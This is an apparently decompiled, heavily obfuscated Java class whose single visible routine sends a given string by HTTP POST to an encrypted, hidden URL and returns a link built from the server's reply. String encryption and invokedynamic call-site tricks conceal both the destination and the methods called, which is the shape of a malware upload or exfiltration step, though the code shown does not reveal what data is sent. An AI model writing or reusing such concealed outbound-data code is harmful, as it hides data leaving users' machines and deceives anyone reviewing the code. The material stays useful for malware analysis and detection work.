/*
 * Decompiled with CFR 0_123.
 */
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.lang.invoke.ConstantCallSite;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;

public class NohV {
    public static String Rjca(String string) throws Exception {
        URL uRL = new URL(mrFx$WjFM.d("\ua070\u9f1e\u555f\u9011\ued54\u40f7\u0913\u5b53\ucfd9\u408e\u5d8e\ufa2f\u72df\uf005\u4b9c\u71cc\u3712\ua111\u292c\u71c3\u99dd"));
        HttpURLConnection httpURLConnection = (HttpURLConnection)NohV.gm(uRL);
        NohV.gm(httpURLConnection, true);
        NohV.gm(httpURLConnection, mrFx$WjFM.d("\ua048\u9f25\u5578\u9035"));
        NohV.gm(NohV.gm(httpURLConnection), (byte[])NohV.gm(string));
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader((InputStream)NohV.gm(httpURLConnection)));
        vbpi vbpi2 = new vbpi((String)NohV.gm(bufferedReader));
        return NohV.gm(NohV.gm(new StringBuilder(mrFx$WjFM.d("\ua070\u9f1e\u555f\u9011\ued54\u40f7\u0913\u5b53\ucfd9\u408e\u5d8e\ufa2f\u72df\uf005\u4b9c\u71cc\u3712\ua111\u292c\u71c3\u99dd")), NohV.gm(vbpi2, mrFx$WjFM.d("\ua073\u9f0f\u5552"))));
    }

    private static Object gm(Object object, Object object2, Object object3) {
        try {
            return new ConstantCallSite(((MethodHandles.Lookup)object).unreflect(o.Y(Integer.valueOf((String)object2, 32))).asType((MethodType)object3));
        }
        catch (ClassNotFoundException | IllegalAccessException reflectiveOperationException) {
            throw new BootstrapMethodError(reflectiveOperationException);
        }
    }
}

